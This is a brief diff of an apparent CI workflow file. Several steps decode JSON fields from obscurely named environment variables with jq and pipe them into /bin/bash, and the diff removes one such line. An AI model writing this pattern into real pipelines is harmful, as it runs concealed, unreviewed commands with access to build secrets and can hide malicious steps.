@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$fkf36917" | jq -r .uzsd8352 | /bin/bash
           echo $muftq4581 | jq -r .q9465 | /bin/bash
-          echo $pgi218 | jq -r .mtjs60 | /bin/bash
           printf '%s' "$op12" | jq -r .i7792 | /bin/bash
           printf '%s' "$c9654" | jq -r .a468 | /bin/bash
           printf '%s' "$i8233" | jq -r .o1123 | /bin/bash
